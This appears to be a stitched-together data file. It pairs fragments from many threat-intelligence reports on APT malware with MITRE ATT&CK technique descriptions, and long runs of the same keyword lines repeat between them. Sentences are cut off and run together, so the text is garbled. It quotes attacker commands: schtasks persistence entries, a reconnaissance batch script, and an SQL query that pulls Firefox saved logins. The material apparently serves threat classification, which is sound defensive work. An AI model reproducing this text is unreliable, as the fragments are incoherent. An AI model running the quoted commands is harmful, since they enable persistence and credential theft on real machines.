These strings have the following format:uuid=[Victim ID]#un=[Username]#cn=[Hostname]#on=[OS Version]#lan=[IP Address]#nop=#ver=1.0uuid=[Victim ID]#un=[Username]#An example of the first string may be seen below:uuid=e29ac6c0-7037-11de-816d-806e6f6e696351c5#un=Josh Grunzweig#cn=WIN-LJLV2NKIOKP#on=mav6miv1#lan=192.168.217.141#nop=#ver=1.0It should be noted that the variables used for this string are different from previous versions
For example, in the previous variant of BADNEWS, the victim’s unique identifier was stored under a variable named ‘uid’, the username was stored in a variable named ‘u’, etc
Unique User-Agents The unique User-Agents used in the HTTP communication between SpeakUp to the C&C are a possible path to the identity of the threat actor behind this campaign
(Source: Dell SecureWorks) Further research revealed additional tools containing the same username (see Figure 21)
PDB strings containing the 'SyberSpace' username
The SP variable is a string containing the victim's username
When the malicious ISAPI filter captures a username matching this variable, it knows to handle the incoming HTTP request as a command to the web shell
It also attempts to issue the following SQL query on the “signons.sqlite” file: “SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins WHERE timePasswordChanged/1000 BETWEEN ? AND ?”   117 ftpUpload Uses FTPManager:uploadFile method and a supplied server name, username and password
The shellcode performs a system survey to collect the victim's computer name and username and then appends those values to a URL string using libjs.inquirerjs[.]com.
Command ID 17 indexes to a function that collects the system information and sends it to the C2 server.

collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
collect usernames
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
whoami 
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
 query user
Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Various utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.
According to the server’s code, the default command that it would issue to newly infected systems was a batch script contained in a file named 0000000000.bat
Code comparison between the default batch script issued by Poison Frog’s C2 and a batch script received by the Helminth Trojan Webshells The data dump included several different webshells apparently used by OilRig to interact with compromised servers
After execution, the malware will use the Dropbox API to make an HTTP GET request using HTTPS over TCP port 443 for the files:  MD5  Filename  d76261ba3b624933a6ebb5dd73758db4  WmiApCom  79b68cdd0044edd4fbf8067b22878644  WmiApCom.bat   The “WmiApCom.bat” file is simply used to start “WmiApCom”, which happens to be the exact same file as the one dropped by the malicious Word documents
Attackers using Comnie are leveraging malicious macros that initially hide decoy documents and shows them when the victim enables macros
Comnie allows the attacker to provide and subsequently execute a batch script (BAT), executable file (EXE), or dynamic-link library (DLL)
While all payloads can be dynamically updated, at the time of delivery, this task launched a COM scriptlet (“.sct” file extension) that downloaded and executed Meterpreter hosted on images.chinabytes[.]info
VBScript #1 The dropped script “58d2a83f7778d5.36783181.vbs” acts as a launcher
When, finally, the first stage shellcode receives a special “FF” signal, it then executes the delivered shellcode
For example, they stated DROPSHOT uses more advanced anti-emulation techniques, utilizes external scripts for self-deletion, and uses memory injection versus external drivers for deployment
The following are the three files:   Defender.sct – The malicious JavaScript based scriptlet file
Users can protect themselves from such attacks by disabling Office macros in their settings and also by being more vigilant when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources
While we have not been able to obtain a secondary payload from the Unicorn generated PowerShell script, we believe that this group uses the script to deliver Metasploit’s Meterpreter as a potential payload as well
Specifically, we discovered code in the PowerShell script that was a match for code in Magic Unicorn containing the comment “one line shellcode injection with native x86 shellcode”
bat: A batch file to set up the service COMSysApp, for an x64 system bat: A batch file to set up the service COMSysApp, for an x86 system ini: A data file with Base64-encoded data for connecting to an FTP server
Via WMI (winmgmt), the JavaScript or VBscript code in the SCT file spawns a PowerShell one-liner which finally consumes the text file
Character  Description  0  File contains batch commands, it executes the batch commands  1  Rename the temporary file as .ps1 extension  2  Rename the temporary file as .vbs extension   Table 2: BONDUPDATER Actions Figure 8 is a screenshot of BONDUPDATER’s DGA implementation
To run persistently on the system, the Trojan will first create a VBScript file:SpecialFolder.CommonApplicationData\srvResesponded.vbs that contains:CreateObject(“WScript.Shell”).Run(“%app%”) The Trojan replaces the %app% string in the above VBScript with the path to its executable
The group often uses the trial version of Cobalt Strike, a publicly available commercial software for “Adversary Simulations and Red Team Operations.” Other public tools used by the group are Metasploit, a well-known free and open source framework for developing and executing exploit code against a remote target machine; Mimikatz, a post-exploitation tool that performs credential dumping; and Empire, “a PowerShell and Python post-exploitation agent.” For detection and exploitation of internet-facing web servers, CopyKittens use Havij, Acunetix and sqlmap
The second file is a PowerShell script which appears to be based on a Rapid7 Ruby Exploitation script that loads arbitrary shellcode
Next, it will copy the first stage shellcode in memory and create a new thread with the shellcode running in it, the code responsible for this execution is shown in Figure 1
For that we can use a Python script, included in Appendix B – Python Scripts
However, in order to kick off the execution of the malware the attacker uses a batch script which executes the malware, but the batch script does more than simply initiate execution of the malware
The full contents of the batch script are given in Appendix C – a.bat
Essentially, we are discussing ongoing activity revolving around several malware families:  KopiLuwak and IcedCoffeer Carbon Mosquito WhiteBear  Technical Rattle Turla’s Shifting to Scripting KopiLuwak and IcedCoffee, WhiteBear, and WhiteAtlas Since at least 2015 Turla has leveraged Javascript, powershell, and wsh in a number of ways, including in their malware dropper/installation operations as well as for implementing complete backdoors
The image is downloaded directly, and the shellcode is loaded and executed in memory
(On the left is NavRAT, and on the right is the shellcode of ROKRAT):    We performed the same analysis for the shellcode located in the downloaded image file and the shellcode is not exactly the same, but the design is very similar
Figure 3: Script code embedded in 29[.]html used to download and run Revenge RAT The script shown in Figure 4 is almost identical to the one used by the script contents of 29[.]html (in Figure 3), the only difference being the absence of a sleep command and the usage of the “forfiles” utility
The downloaded document template contains the malicious macro codes, which executes a VBScript (VBS).
The attackers typically distribute Netwalker ransomware with the use of a reflective PowerShell loader script that has been protected from casual analysis with several layers of obfuscation.
The attackers orchestrate attacks using batch or PowerShell scripts that are executed, with the help of domain controllers, on any machine the DC can reach.
So this method uses psexec itself to copy the payload over the network, overwrite earlier versions (if found), and run it without waiting for any response. They use batch files that leverage psexec , again, to push PowerShell loader scripts out to machines the network scanner finds on the internal network.

The files uploaded to this webshell included the same compiled python script that would scan remote systems that were vulnerable to CVE-2017-0144 (EternalBlue) that we saw uploaded to the other errr.aspx webshell.

Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
Javascript 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 PowerShell 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 VBScript 
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
 Python
Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).

Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)
Screenshots The data dump includes several screenshots of resources that the leaker alleged was related to the OilRig group
Screenshot provided in leak showing administrative panel for hosting provider Berbid Server The screenshot showed the administrative panel for a VPS account on DeltaHost with four different virtual servers, as seen in Figure 20
Screenshot in leak of administrative panel for an account at DeltaHost If we use the filename of this screenshot and assume that it was taken on March 29, 2019 and subtract 194 days from this date, it is possible that this server had been operational since at least September 16, 2018
This screenshot is via an RDP session as indicated by the tab located at the top of the screen and is located at 164.132.67[.]216 which is hosted by OVH
The malware can exfiltrate keystrokes, screenshots, browser-related data like cookies and history, decrypted when possible
Malware features Remexi boasts features that allow it to gather keystrokes, take screenshots of windows of interest (as defined in its configuration), steal credentials, logons and the browser history, and execute remote commands
Can capture all screen (“AllScreen”) or the active window (“ActiveWindow”)   -ms Screenshot file name to save in Cache006 subdirectory, zipped with password from configuration
The second email references a Hong Kong University alumni organization that fears votes in a referendum to appoint a Vice-Chancellor will be co-opted by pro-Beijing interests.[9]  Figure 1: Lure Screenshots The group’s previous activities against financial and policy organizations have largely focused on spear phishing emails written in English, destined for Western audiences
SCREEN Takes a PNG screenshot of the main screen and names the file with timestamps, then uploads it to the C2 server using POST at the path “/FeedBack.php”
While sending to the C2 server, the data is formatted as follows: @{SYSINFO  = $get.ToString(); ACTION = "REGISTER";}  Ability to take screenshots
The “screenshot” command takes a screenshot that is saved as a.PNG file in “ProgramData“
The screen capture below shows the decryption function.It then calls the StartAndPatchRegAsm function.This function tries to find the original Microsoft RegAsm executable path
Figure 3: Screen capture of the downloader executed on OS X El Capitan
Interestingly, we’ve seen recent samples embedding decoy documents that are screenshots of botnet C&C panels or dumps of credit card numbers
The C2 server can also send a PowerShell command to capture and store a screenshot of a victim’s system
POWRUNER will send the captured screenshot image file to the C2 server if the “fileupload” command is issued
The command handle looks for the following command strings in Table 3:    Command Description   $fileDownload Uploads the contents of a specified file to C2   $importModule Adds a specified PowerShell module to the current script   $screenshot Executes the contents of the command, which should be the string ‘$screenshot’
23 Take screenshot, temporarily store it as TPX499.dat, and upload it to the C2
Periodic low resolution screenshots
SpyNote RAT captured the device’s screen activities along with audio using the  MediaProjectionCallback functionality (available with Lollipop, the Android 5.0 release, and later) and saved the output in a file named "video.mp4" as shown in the following screenshot:          Figure 5 : Output File     SMS stealing  SpyNote RAT was also observed stealing SMS messages from the affected devices, as shown in screenshot below:          Figure 6: Reading SMS messages     Stealing contacts The ability to steal contacts is a favorite feature for spyware developers, as the stolen contacts can be used to further spread the spyware
[Screenshot 1] Encrypted Login Packet sent by Gh0stRAT infected PC  In addition to a standard malware analysis blog post, I’d also like to take this time to document and describe my methods for analysis, in the hopes that you as a reader will use these techniques in the future
Returns the screenshot to the C2 via: <img src=’data:image/jpeg;base64,[base64 of screenshot]’ width=800 height=500 /><br>   111 startTakeScreenShot Creates a thread to take a screenshot at a set interval (default: every 10 seconds)
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
capture screenshot
Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)

It also deletes Windows Event Logs : Application, Security, Setup, System
This simply acts as cleanup to ensure original file artifacts no longer reside on the infected machine
This is a guest post by independent security researcher James Quinn. This will be Part 1 of a series titled Reversing Gh0stRAT Variants.  As 2018 drew to a close and 2019 took over, I began to see a different behavior from SMB malware authors.  Instead of massive, multi-staged cryptocurrency miners, I began to see more small, covert RATs serving as partial stage1’s.  Of these samples, there was one specific sample that stood out to me.  A Gh0stRAT variant, this sample not only changed the Gh0stRAT header from “Gh0st” to “nbLGX”, it also hid its traffic with an encryption algorithm over the entire TCP segment, in addition to the standard Zlib compression on the Gh0stRAT data.  Some key functionality is below:   Can download more malware   Offline Keylogger   Cleans Event logs
Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.

Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.
The same situation applies to authentication by key pair – the server contains a pre-defined constant public key and it allows authentication only if a particular private key is used
As mentioned previously, Buckeye also uses a number of hacking tools, including the following: Keylogger: The keylogger is configured using the command line parameters: NetworkService, Replace, Install, Register and Unregister
The keylogger then records keystrokes in encrypted files, for example: thumbcache_96.dbx
The malware initiates its main function of capturing user keystrokes and sending them to the control server using standard Windows networking APIs
NetWire has a built-in keylogger that can capture inputs from peripheral devices such as USB card readers
Example of decoded keylogger output
It is commonly sold on various hacking forums as a keylogger and stealer that can be used to monitor systems and exfiltrate information from those systems
Deobfuscated, we can see it is the HawkEye Keylogger — Reborn v9, Version=9.0.1.6
8 Upload the TPX498.dat file, which contains the list of collected keystrokes
63 64 ku64.dll ku32.dll Keylogger & clipboard monitor
keylogger) may be missing for these platforms
However, the campaign that the PDC has recently observed has been delivering this keylogger exclusively
There does appear to be function names however, including PeekMessageA, which has been previously observed in other keylogging malware
XAgent C2 Communications The macOS variant of XAgent has ability to receive commands from threat actors via its command and control channel, but is also capable of logging key strokes via its keylogger functionality
Keylogging Functionality XAgent also has a keylogger functionality that allows the threat actors to steal credentials as the user types them
This callback function will call a function named pressedKeyWithKeyCode, which is responsible for logging the keystrokes
LONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the Window’s temp folder.
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
keylog 
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
 capture keystrokes
Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).
(Source: SecureWorks) Some payloads leveraged DLL side loading, a technique that involves running a legitimate, typically digitally signed, program that loads a malicious DLL
Figure 1 Side-by-side of the lure images within ThreeDollars in the October 2017 and the January 2018 attacks   Superficially, we can immediately see the images are quite similar, but with some glaring differences
The technique of having a signed, legitimate, executable load a malicious library is commonly referred to as side-loading, and has been witnessed in a number of campaigns and malware families in the past
DLL side loading is often used to maintain persistence on the compromised system
DLL side loading has been used to maintain persistence on the compromised system
Hunter queried the following URIs in a specific order to determine if the associated software configurations are insecure, and all queries contained the HttpClient User-Agent:  GET /manager/html/ — Tomcat web application manager GET /jmx-console/ — JBoss configuration GET /CFIDE/administrator/login.cfm — ColdFusion configuration  Installation TG-3390 uses DLL side loading, a technique that involves running a legitimate, typically digitally signed, program that loads a malicious DLL
Note: DLL side loading is a prevalent persistence technique that is used to launch a multitude of backdoors
As security controls have improved, DLL side loading has evolved to load a payload stored in a different directory or from a registry value
Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).

Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)
Send exfiltrated data   taskkill.exe Ends working cycle of modules    Persistence Persistence modules are based on scheduled tasks and system registry
For newer operating systems, events.exe creates task.xml as follows:  Then it creates a Windows scheduled task using the following command:       schtasks.exe /create /TN \"Events\\CacheTask_<user_name_here>" /XML \"<event_cache_dir_path>t /F"     At the system registry level, modules achieve persistence by adding themselves into the key: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit when it finds possible add values to the Winlogon subkey, and in HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Activity Manager
In addition, the PowerShell implant did not contain a mechanism to persist beyond a simple scheduled task
After execution of every task, the malware sleeps for one minute before executing the next task
The main similarities include the use of a scheduled task to persistently execute on the system, as well as the same general process to communicate with its C2 server
With the Trojan moved its final location, it will then create a scheduled task to run a VBScript to make sure it runs persistently
The decoded string from the Sch resource is: SchTasks /Create /SC MINUTE /MO 3 /TN “%n%” /TR “wscript %path%” /f The decoded string from the VBS resource is: CreateObject(“WScript.Shell”).Run(“%app%”) The %n% string in the schtasks command above will be replaced with the GUID saved to GDI.bin
This differs from the previous OopsIE variant that used a hardcoded task name for the scheduled task
This process ultimately attempts to run the Trojan every three minutes, which is important as OopsIE relies on this scheduled task as it does not include a main loop to continue its execution
After creating this scheduled task for persistence, the Trojan will begin communicating with its C2 server
A scheduled task is also generated to maintain persistence of the payload
Office365DCOMCheck or SystemDiskClean) as the name for the scheduled task to maintain persistence on the victim host
The malware component, test.exe, uses the Windows command "cmd.exe" /C whoami” to verify it is running with the elevated privileges of “System” and creates persistence by creating the following scheduled task:     schtasks /create /tn "mysc" /tr C:\Users\Public\test.exe /sc ONLOGON     /ru "System" When executed, the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port 1913
The malware also contains an embedded .NET wrapper DLL for creating and managing scheduled tasks on Windows systems
This DLL is used to create a scheduled task that points to the QuasarRAT binary, microsoft_network.exe, allowing it to remain persistent after reboot
They use At.exe to schedule tasks to run self-extracting RAR archives, which install either HttpBrowser or PlugX
Another batch script run by a scheduled task renames the archives on the file server (see Figure 15)
The scripts create scheduled tasks and also retrieve, decode, and execute a copy of Revenge RAT
Figure 1: Code from 29[.]html scheduling the first task to run a script from pastebin The second task (“MSOFFICEER”) in Figure 2 runs the script contents of a different page of the same blog, blog-page[.]html, every 100 minutes
The spreadsheet also creates a scheduled task named "windows update check" that runs the file C:\Users\<user_name>\.templates\System Manager.exe every minute.
When the trojan starts up it will attempt to install a scheduled task with the name of “Java Maintenance64” to keep itself running.
The campaigns maintain persistence on machines by creating two daily scheduled task entries.
The script writes files to the path % appdata %\Roaming\Microsoft\Templates\, then creates two task entries triggered to run daily.
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
 scheduled task
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
sch.exe
Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)

Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.(Citation: ProofPoint Serpent)
Cyber threat groups’ access to the media organization’s networks could potentially provide the government advance warning on upcoming protests, information on pro-democracy group leaders, and insights needed to disrupt activity on the Internet, such as what occurred in mid-2014 when several websites were brought down in denial of service attacks.[8] Threat Actors Use Spear Phishing Written in Traditional Chinese Script in Attempted Intrusions In August 2015, the threat actors sent spear phishing emails to a number of Hong Kong-based media organizations, including newspapers, radio, and television
On occasions, the phishing emails contained links to external domains to download the first stage, and sometimes the first stage was attached to the email itself
These emails included recruitment themed lures and contained links to malicious HTML application (.hta) files
The first link was labeled as "Comparison of Major Tasks in '16 & '17" and the second link was identified as "Comparison between '16 & '17".Upon opening these links the user was presented with a further decoy Hangul document
It is highly likely the adversary then used spear-phishing attacks containing links to these malicious documents as a delivery mechanism
Group123 Links?  As we explore the Korean malware landscape, we always have burning questions relating to any possible links with Group123
It’s important to remember, that while we were using Bitly links to help gauge click location, anyone who clicks these links (including researchers) are also counted
email with an embedded tracking link
Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an "IDN homograph attack").(Citation: CISA IDN ST05-016)

Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)
A total of 64MB of garbage data is appended to this copied file, likely as a way to deter any security products in place that may be scanning files on disk
Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. 

Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ) 
Using this example, Comnie will then request data to supply to the BAT script, via the following decrypted request: h=HOSTNAME-PC&f=gethostinfo.bat&c=& Based on network traffic witnessed, the remote C2 server was found to respond with the following information:       netstat -ano > %TEMP%\info.datipconfig /all >> %TEMP%\info.datroute PRINT >> %TEMP%\info.datnet view >> %TEMP%\info.dattasklist >> %TEMP%\info.datnet user >> %TEMP%\info.datnet start >> %TEMP%\info.dat       This script is written to a temporary file prior to be executed
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
